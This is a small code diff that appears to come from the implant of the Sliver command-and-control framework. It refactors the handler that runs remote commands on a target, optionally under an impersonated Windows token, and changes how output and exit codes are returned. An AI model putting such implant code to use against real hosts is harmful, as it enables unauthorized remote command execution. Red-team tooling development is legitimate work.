@@ -486,7 +486,6 @@ func ifconfig() *sliverpb.Ifconfig {
 func executeHandler(data []byte, resp RPCResponse) {
 	var (
 		err error
-		cmd *exec.Cmd
 	)
 	execReq := &sliverpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
@@ -496,12 +495,10 @@ func executeHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
+
 	execResp := &sliverpb.Execute{}
-	if len(execReq.Args) != 0 {
-		cmd = exec.Command(execReq.Path, execReq.Args...)
-	} else {
-		cmd = exec.Command(execReq.Path)
-	}
+	cmd := exec.Command(execReq.Path, execReq.Args...)
+
 	//{{if eq .Config.GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(priv.CurrentToken),
@@ -509,17 +506,21 @@ func executeHandler(data []byte, resp RPCResponse) {
 	//{{end}}
 
 	if execReq.Output {
-		res, err := cmd.Output()
+		res, err := cmd.CombinedOutput()
 		//{{if .Config.Debug}}
 		log.Println(string(res))
 		//{{end}}
 		if err != nil {
-			execResp.Response = &commonpb.Response{
-				Err: fmt.Sprintf("%s", err),
+			// Exit errors are not a failure of the RPC, but of the command.
+			if exiterr, ok := err.(*exec.ExitError); ok {
+				execResp.Status = uint32(exiterr.ExitCode())
+			} else {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
 			}
-		} else {
-			execResp.Result = string(res)
 		}
+		execResp.Result = string(res)
 	} else {
 		err = cmd.Start()
 		if err != nil {
